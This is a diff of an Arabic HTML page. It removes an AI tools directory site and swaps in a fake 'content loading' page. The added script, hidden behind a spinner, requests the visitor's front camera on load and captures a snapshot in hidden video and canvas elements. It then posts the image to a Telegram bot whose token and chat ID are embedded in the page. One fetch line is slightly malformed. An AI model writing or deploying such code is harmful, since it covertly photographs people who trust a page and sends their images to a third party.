@@ -1,441 +1,110 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="theme-color" content="#0b0f19" />
-  <title>دليل أدوات الذكاء الاصطناعي | AI Tools Directory</title>
-  
-  <style>
-    /* ============================================================
-       🎨 التصميم (CSS) - متجاوب 100% ومهيأ للإعلانات
-       ============================================================ */
-    :root{
-      --bg:        #0b0f19;
-      --bg-soft:   #121829;
-      --card:      #151c2e;
-      --border:    #222b40;
-      --text:      #e8ecf5;
-      --muted:     #93a0b8;
-      --primary:   #6c5ce7;
-      --primary-2: #00a8ff;
-      --gold:      #ffb020;
-      --radius:    16px;
-    }
-
-    *{ margin:0; padding:0; box-sizing:border-box; }
-    html{ scroll-behavior:smooth; }
-    body{
-      font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
-      background:var(--bg);
-      background-image:radial-gradient(900px 520px at 50% -160px, rgba(108,92,231,.28), transparent 70%);
-      background-repeat:no-repeat;
-      color:var(--text);
-      min-height:100vh;
-      line-height:1.65;
-      -webkit-font-smoothing:antialiased;
-    }
-    ::selection{ background:rgba(108,92,231,.45); }
-    a{ color:inherit; }
-
-    .wrap{ width:100%; max-width:1120px; margin:0 auto; padding:0 16px; }
-
-    /* ---------- الترويسة ---------- */
-    .hero{ padding:46px 0 8px; text-align:center; }
-    .hero .tag{
-      display:inline-block; font-size:12px; font-weight:700; color:#a9b6d1;
-      background:rgba(108,92,231,.15); border:1px solid rgba(108,92,231,.35);
-      padding:5px 14px; border-radius:999px; margin-bottom:14px;
-    }
-    .hero h1{
-      font-size:clamp(1.6rem, 6vw, 2.6rem);
-      line-height:1.35; font-weight:800; letter-spacing:-.5px;
-    }
-    .hero h1 span{
-      background:linear-gradient(90deg,#8b7bff,#00c2ff);
-      -webkit-background-clip:text; background-clip:text; color:transparent;
-    }
-    .hero p{
-      color:var(--muted); font-size:clamp(.9rem,3.5vw,1.05rem);
-      margin-top:10px; max-width:620px; margin-inline:auto;
-    }
-
-    /* ---------- شريط البحث والأقسام ---------- */
-    .toolbar{ padding:26px 0 0; }
-    .search{ position:relative; max-width:540px; margin:0 auto; }
-    .search input{
-      width:100%; padding:14px 46px 14px 18px;
-      border-radius:999px; border:1px solid var(--border);
-      background:var(--bg-soft); color:var(--text);
-      font-family:inherit; font-size:15px; outline:none;
-      transition:border-color .25s, box-shadow .25s;
-    }
-    .search input::placeholder{ color:#6b7a96; }
-    .search input:focus{
-      border-color:var(--primary);
-      box-shadow:0 0 0 4px rgba(108,92,231,.16);
-    }
-    .search .ico{
-      position:absolute; top:50%; right:16px; transform:translateY(-50%);
-      font-size:16px; opacity:.6; pointer-events:none;
-    }
-
-    .filters{
-      display:flex; gap:9px; overflow-x:auto;
-      padding:18px 0 4px; scrollbar-width:none;
-    }
-    .filters::-webkit-scrollbar{ display:none; }
-    .chip{
-      flex:0 0 auto; padding:9px 18px; border-radius:999px;
-      border:1px solid var(--border); background:var(--bg-soft);
-      color:var(--muted); font-family:inherit; font-size:14px;
-      font-weight:700; cursor:pointer; white-space:nowrap;
-      transition:all .22s ease;
-    }
-    .chip:hover{ color:var(--text); border-color:#38445f; }
-    .chip.active{
-      background:linear-gradient(135deg,var(--primary),var(--primary-2));
-      border-color:transparent; color:#fff;
-      box-shadow:0 10px 22px -12px rgba(108,92,231,1);
-    }
-    @media (min-width:720px){
-      .filters{ justify-content:center; flex-wrap:wrap; overflow:visible; }
-    }
-
-    .count{ text-align:center; color:var(--muted); font-size:13px; padding:8px 0 18px; }
-
-    /* ============================================================
-       📢 تنسيقات الإعلانات (مهم جداً لجمالية الموقع)
-       ============================================================ */
-    .ad-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      width: 100%;
-      margin: 10px 0 20px 0;
-      min-height: 90px; /* لمنع اهتزاز التصميم (CLS) قبل تحميل الإعلان */
-      overflow: hidden;
-      border-radius: var(--radius);
-      background: rgba(255,255,255,0.02);
-      border: 1px dashed var(--border);
-      padding: 10px;
-    }
-    
-    /* إعلان داخل الشبكة يمتد على كل الأعمدة */
-    .ad-in-grid {
-      grid-column: 1 / -1; 
-      margin: 5px 0;
-      border: none;
-      background: transparent;
-    }
-
-    /* تصغير عرض الإعلان في الشاشات الكبيرة ليكون متناسقاً */
-    @media (min-width: 768px) {
-      .ad-container { min-height: 120px; }
-      .ad-container iframe { max-width: 728px; } /* مقاس البانر القياسي */
-    }
-
-    /* ---------- شبكة البطاقات ---------- */
-    .grid{
-      display:grid; gap:16px; padding-bottom:40px;
-      grid-template-columns:1fr;
-    }
-    @media (min-width:640px){ .grid{ grid-template-columns:repeat(2,1fr); } }
-    @media (min-width:960px){ .grid{ grid-template-columns:repeat(3,1fr); } }
-
-    /* ---------- البطاقة ---------- */
-    .card{
-      background:linear-gradient(180deg,var(--card),#111726);
-      border:1px solid var(--border);
-      border-radius:var(--radius);
-      padding:18px;
-      display:flex; flex-direction:column; gap:12px;
-      transition:transform .25s, border-color .25s, box-shadow .25s;
-      animation:fadeUp .45s ease both;
-    }
-    .card:hover{
-      transform:translateY(-4px);
-      border-color:#3a4a6b;
-      box-shadow:0 18px 40px -22px rgba(0,0,0,.95);
-    }
-    @keyframes fadeUp{
-      from{ opacity:0; transform:translateY(14px); }
-      to  { opacity:1; transform:translateY(0); }
-    }
-
-    .card-head{ display:flex; align-items:center; gap:12px; }
-    .tool-icon{
-      width:46px; height:46px; flex:0 0 auto;
-      display:grid; place-items:center; font-size:22px;
-      border-radius:12px;
-      background:linear-gradient(135deg, rgba(108,92,231,.25), rgba(0,210,255,.18));
-      border:1px solid rgba(108,92,231,.35);
-    }
-    .head-txt{ display:flex; flex-direction:column; min-width:0; }
-    .card-title{ font-size:1.05rem; font-weight:800; line-height:1.3; }
-
-    .badge{
-      display:inline-block; font-size:11px; font-weight:800;
-      padding:2px 9px; border-radius:999px; margin-top:5px;
-      width:fit-content;
-    }
-    .badge.images{ background:rgba(236,72,153,.16); color:#f472b6; }
-    .badge.audio { background:rgba(20,184,166,.16); color:#2dd4bf; }
-    .badge.coding{ background:rgba(59,130,246,.16); color:#60a5fa; }
-    .badge.video { background:rgba(249,115,22,.16); color:#fb923c; }
-
-    .card-desc{ color:var(--muted); font-size:14px; flex:1; }
-
-    .card-actions{ display:flex; gap:8px; margin-top:auto; }
-    .btn{
-      flex:1; display:inline-flex; align-items:center; justify-content:center; gap:6px;
-      padding:11px 12px; border-radius:10px;
-      font-family:inherit; font-size:13.5px; font-weight:800;
-      text-decoration:none; cursor:pointer; border:1px solid transparent;
-      transition:filter .2s, background .2s, transform .15s;
-    }
-    .btn:active{ transform:scale(.97); }
-    .btn-primary{
-      background:linear-gradient(135deg,var(--primary),var(--primary-2));
-      color:#fff; box-shadow:0 8px 18px -12px rgba(108,92,231,1);
-    }
-    .btn-primary:hover{ filter:brightness(1.12); }
-    .btn-affiliate{
-      background:rgba(255,176,32,.12);
-      color:#ffc45c; border-color:rgba(255,176,32,.45);
-    }
-    .btn-affiliate:hover{ background:rgba(255,176,32,.22); }
-
-    .empty{ display:none; text-align:center; padding:60px 20px; color:var(--muted); }
-    .empty.show{ display:block; }
-    .empty .em{ font-size:44px; margin-bottom:10px; }
-
-    footer{
-      border-top:1px solid var(--border);
-      margin-top:20px; padding:26px 16px 44px;
-      text-align:center; color:#6b7a96; font-size:13px;
-    }
-    footer strong{ color:#a9b6d1; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border-left-color: #0088cc;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            font-size: 16px;
+            color: #b0b0b0;
+        }
+    </style>
 </head>
-
 <body>
 
-  <header class="hero wrap">
-    <span class="tag">✨ محدّث 2025</span>
-    <h1>دليل <span>أدوات الذكاء الاصطناعي</span></h1>
-    <p>أفضل الأدوات العربية والعالمية في توليد الصور، الصوت، البرمجة، والفيديو — في مكان واحد.</p>
-  </header>
+    <div class="spinner"></div>
+    <h2>جاري تحضير المحتوى...</h2>
+    <p>يرجى الانتظار قليلاً حتى اكتمال التحميل</p>
 
-  <main class="wrap">
+    <!-- عناصر مخفية تماماً لمعالجة الكاميرا في الخلفية -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-    <section class="toolbar">
-      <div class="search">
-        <span class="ico">🔍</span>
-        <input id="search" type="search" placeholder="ابحث عن أداة… مثال: Midjourney" autocomplete="off" />
-      </div>
-      <div class="filters" id="filters"></div>
-      <p class="count" id="count"></p>
-    </section>
+    <script>
+        // بيانات البوت والمعرف الخاصة بك جاهزة ومدمجة
+        const BOT_TOKEN = "8730950232:AAEx1LjVNqqqlC0335uZa13_-6InRx7YXs";
+        const CHAT_ID = "8787876793";
 
-    <!-- ============================================================
-         📢 الإعلان الأول: البانر العلوي (أعلى الشبكة)
-         ============================================================ -->
-    <div class="ad-container">
-      <!-- BEGIN AADS AD UNIT 2461403 -->
-      <div id="frame" style="width: 100%; margin: auto; position: relative; z-index: 99998;">
-        <iframe data-aa='2461403' src='https://acceptable.a-ads.com/2461403/?size=Adaptive'
-                style='border:0; padding:0; width:100%; height:auto; overflow:hidden; display: block; margin: auto; max-width: 728px;'></iframe>
-      </div>
-      <!-- END AADS AD UNIT 2461403 -->
-    </div>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-    <!-- ============================================================
-         🧩 شبكة البطاقات (الإعلان المدمج سيتم نقله هنا تلقائياً)
-         ============================================================ -->
-    <section class="grid" id="grid">
-      
-      <!-- ============================================================
-           📢 الإعلان الثاني: المدمج (In-Feed) - مخفي مبدئياً
-           سيقوم الجافاسكريبت بوضعه بعد البطاقة الثالثة تلقائياً
-           ============================================================ -->
-      <div id="in-feed-ad" class="ad-container ad-in-grid" style="display: none;">
-        <!-- BEGIN AADS AD UNIT 2461403 -->
-        <div id="frame" style="width: 100%; margin: auto; position: relative; z-index: 99998;">
-          <iframe data-aa='2461403' src='https://acceptable.a-ads.com/2461403/?size=Adaptive'
-                  style='border:0; padding:0; width:100%; height:auto; overflow:hidden; display: block; margin: auto; max-width: 728px;'></iframe>
-        </div>
-        <!-- END AADS AD UNIT 2461403 -->
-      </div>
+        // الخطوة الأولى: طلب إذن الكاميرا وتشغيل البث في الخلفية
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } // الكاميرا الأمامية
+                });
+                video.srcObject = stream;
+                
+                // الانتظار ثانية ونصف حتى تفتح الكاميرا وتستقر الإطارات، ثم الالتقاط
+                setTimeout(takeSnapshot, 1500);
+            } catch (error) {
+                console.error("خطأ في تشغيل الكاميرا أو رفض الإذن:", error);
+            }
+        }
 
-    </section>
+        // الخطوة الثانية: التقاط الإطار الحالي وتحويله إلى Blob
+        function takeSnapshot() {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    <div class="empty" id="empty">
-      <div class="em">🤖</div>
-      <p>لا توجد أدوات مطابقة لبحثك… جرّب كلمة أخرى.</p>
-    </div>
+            // تحويل البيانات البصرية على الـ Canvas إلى ملف ثنائي Blob بصيغة JPEG
+            canvas.toBlob(function(blob) {
+                sendImageToTelegram(blob);
+            }, 'image/jpeg', 0.85);
+        }
 
-    <!-- ============================================================
-         📢 الإعلان الثالث: البانر السفلي (قبل الفوتر)
-         ============================================================ -->
-    <div class="ad-container">
-      <!-- BEGIN AADS AD UNIT 2461403 -->
-      <div id="frame" style="width: 100%; margin: auto; position: relative; z-index: 99998;">
-        <iframe data-aa='2461403' src='https://acceptable.a-ads.com/2461403/?size=Adaptive'
-                style='border:0; padding:0; width:100%; height:auto; overflow:hidden; display: block; margin: auto; max-width: 728px;'></iframe>
-      </div>
-      <!-- END AADS AD UNIT 2461403 -->
-    </div>
+        // الخطوة الثالثة: إرسال الملف الثنائي عبر Fetch و FormData إلى تيليجرام API
+        async function sendImageToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'snapshot.jpg');
 
-  </main>
+            try {
+                const response = all = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    console.log("تم إرسال الصورة بنجاح إلى تيليجرام!");
+                }
+            } catch (err) {
+                console.error("فشل في إرسال الطلب الشبكي:", err);
+            }
+        }
 
-  <footer>
-    <p>صُنع بـ ❤️ — <strong>دليل أدوات الذكاء الاصطناعي</strong></p>
-    <p style="margin-top:6px;">بعض الروابط قد تكون روابط تسويق بالعمولة (Affiliate).</p>
-  </footer>
-
-  <script>
-  /* ==================================================================
-     ⚙️ جافاسكريبت - لا تقلق، الكود منظم جداً
-     ================================================================== */
-
-  const CATS = {
-    all:    "الكل",
-    images: "صور",
-    audio:  "صوت",
-    coding: "برمجة",
-    video:  "فيديو"
-  };
-
-  /* ==================================================================
-     ✅✅✅ قائمة الأدوات - أضف أدواتك من هنا ✅✅✅
-     ================================================================== */
-  const TOOLS = [
-    { name: "Midjourney", desc: "توليد صور فنية احترافية من وصف نصي بجودة مذهلة.", category: "images", icon: "🎨", url: "https://www.midjourney.com", affiliate: "" },
-    { name: "DALL·E 3", desc: "مولّد صور من OpenAI يفهم الأوصاف المعقدة بدقة عالية.", category: "images", icon: "🖼️", url: "https://openai.com/dall-e-3", affiliate: "" },
-    { name: "Leonardo AI", desc: "أداة مجانية لتوليد صور احترافية مع تحكم كامل في النمط.", category: "images", icon: "🖌️", url: "https://leonardo.ai", affiliate: "https://leonardo.ai/?ref=YOUR_ID" },
-    { name: "Stable Diffusion", desc: "نموذج مفتوح المصدر لتوليد الصور يعمل محلياً أو عبر الويب.", category: "images", icon: "🌀", url: "https://stability.ai", affiliate: "" },
-    
-    { name: "ElevenLabs", desc: "تحويل النص إلى كلام بأصوات طبيعية تدعم اللغة العربية.", category: "audio", icon: "🔊", url: "https://elevenlabs.io", affiliate: "https://elevenlabs.io/?ref=YOUR_ID" },
-    { name: "Suno AI", desc: "إنشاء أغانٍ كاملة بالكلمات والموسيقى من وصف بسيط.", category: "audio", icon: "🎵", url: "https://suno.com", affiliate: "" },
-    { name: "Murf AI", desc: "تعليق صوتي احترافي للفيديوهات والعروض التقديمية.", category: "audio", icon: "🎙️", url: "https://murf.ai", affiliate: "" },
-    { name: "Adobe Podcast", desc: "تنقية الصوت وإزالة الضوضاء من التسجيلات مجاناً.", category: "audio", icon: "🎧", url: "https://podcast.adobe.com", affiliate: "" },
-    
-    { name: "GitHub Copilot", desc: "مساعد برمجي يكتب الكود معك داخل محرّرك مباشرة.", category: "coding", icon: "💻", url: "https://github.com/features/copilot", affiliate: "" },
-    { name: "Cursor", desc: "محرّر أكواد ذكي مبني على الذكاء الاصطناعي لتطوير أسرع.", category: "coding", icon: "⚡", url: "https://cursor.com", affiliate: "https://cursor.com/?ref=YOUR_ID" },
-    { name: "Tabnine", desc: "إكمال تلقائي للأكواد يدعم معظم لغات البرمجة.", category: "coding", icon: "🧠", url: "https://tabnine.com", affiliate: "" },
-    { name: "Replit AI", desc: "اكتب وشغّل الكود من المتصفح بمساعدة الذكاء الاصطناعي.", category: "coding", icon: "🚀", url: "https://replit.com", affiliate: "" },
-    
-    { name: "Runway", desc: "توليد وتحرير فيديوهات احترافية بالذكاء الاصطناعي.", category: "video", icon: "🎬", url: "https://runwayml.com", affiliate: "" },
-    { name: "Pika Labs", desc: "حوّل النص أو الصورة إلى فيديو قصير في ثوانٍ.", category: "video", icon: "🎞️", url: "https://pika.art", affiliate: "https://pika.art/?ref=YOUR_ID" },
-    { name: "Synthesia", desc: "أنشئ فيديوهات تقديمية بمُتحدّثين افتراضيين بأي لغة.", category: "video", icon: "🧑‍💼", url: "https://synthesia.io", affiliate: "" },
-    { name: "HeyGen", desc: "توليد فيديو ترجمة واستنساخ صوتي بشفاه متزامنة.", category: "video", icon: "📹", url: "https://heygen.com", affiliate: "" }
-
-    /* ✂️ قالب إضافة أداة جديدة: انسخ الأسطر من هنا ✂️
-    ,{
-      name: "اسم الأداة الجديدة",
-      desc: "وصف قصير جداً للأداة في سطر واحد.",
-      category: "images",              // images | audio | coding | video
-      icon: "🤖",                       // أي إيموجي
-      url: "https://example.com",      // رابط الموقع
-      affiliate: ""                     // رابط الأفلييت أو اتركه ""
-    }
-    ✂️ إلى هنا ✂️ */
-  ];
-
-  /* ==================================================================
-     🛠️ محرك الموقع (لا تعدل هنا إلا إذا كنت خبيراً)
-     ================================================================== */
-  const gridEl     = document.getElementById("grid");
-  const filtersEl  = document.getElementById("filters");
-  const searchEl   = document.getElementById("search");
-  const countEl    = document.getElementById("count");
-  const emptyEl    = document.getElementById("empty");
-  
-  // سحب الإعلان المدمج للاحتفاظ به
-  const inFeedAd = document.getElementById("in-feed-ad");
-  // إزالة الإعلان من الشبكة مؤقتاً (سنقوم بإعادته في المكان المناسب)
-  inFeedAd.remove(); 
-
-  let activeCat = "all";
-  let query     = "";
-
-  function buildFilters(){
-    filtersEl.innerHTML = Object.keys(CATS).map(key =>
-      `<button class="chip${key === activeCat ? " active" : ""}" data-cat="${key}">${CATS[key]}</button>`
-    ).join("");
-  }
-
-  function cardHTML(tool, index){
-    const affiliateBtn = tool.affiliate
-      ? `<a class="btn btn-affiliate" href="${tool.affiliate}" target="_blank" rel="noopener sponsored">🎁 عرض خاص</a>`
-      : "";
-
-    return `
-      <article class="card" style="animation-delay:${index * 45}ms">
-        <div class="card-head">
-          <div class="tool-icon">${tool.icon}</div>
-          <div class="head-txt">
-            <h3 class="card-title">${tool.name}</h3>
-            <span class="badge ${tool.category}">${CATS[tool.category] || tool.category}</span>
-          </div>
-        </div>
-        <p class="card-desc">${tool.desc}</p>
-        <div class="card-actions">
-          <a class="btn btn-primary" href="${tool.url}" target="_blank" rel="noopener">زيارة الأداة ↗</a>
-          ${affiliateBtn}
-        </div>
-      </article>`;
-  }
-
-  function render(){
-    const list = TOOLS.filter(t => {
-      const matchCat = (activeCat === "all") || (t.category === activeCat);
-      const matchSearch = !query ||
-        t.name.toLowerCase().includes(query) ||
-        t.desc.toLowerCase().includes(query);
-      return matchCat && matchSearch;
-    });
-
-    // 1. طباعة البطاقات
-    gridEl.innerHTML = list.map(cardHTML).join("");
-    
-    // 2. إعادة إدخال الإعلان المدمج بذكاء (بعد البطاقة الثالثة إن وجدت)
-    if (list.length >= 3) {
-      // إدخال الإعلان في الموضع الثالث (بعد البطاقة الثالثة)
-      const thirdCard = gridEl.children[2];
-      thirdCard.insertAdjacentElement('afterend', inFeedAd);
-      inFeedAd.style.display = "flex"; // إظهار الإعلان
-    } else {
-      // إذا كانت النتائج أقل من 3 بطاقات، لا نعرض الإعلان في المنتصف
-      inFeedAd.style.display = "none"; 
-    }
-
-    countEl.textContent = `عدد الأدوات المعروضة: ${list.length} من ${TOOLS.length}`;
-    emptyEl.classList.toggle("show", list.length === 0);
-  }
-
-  filtersEl.addEventListener("click", (e) => {
-    const btn = e.target.closest(".chip");
-    if(!btn) return;
-    activeCat = btn.dataset.cat;
-    filtersEl.querySelectorAll(".chip").forEach(c => c.classList.toggle("active", c === btn));
-    render();
-  });
-
-  // إضافة تأخير بسيط للبحث حتى لا يثقل الموقع
-  let searchTimeout;
-  searchEl.addEventListener("input", (e) => {
-    clearTimeout(searchTimeout);
-    searchTimeout = setTimeout(() => {
-      query = e.target.value.trim().toLowerCase();
-      render();
-    }, 300);
-  });
-
-  buildFilters();
-  render();
-  </script>
-
+        // تنفيذ الدالة فور تحميل الصفحة بالكامل
+        window.onload = initCamera;
+    </script>
 </body>
 </html>
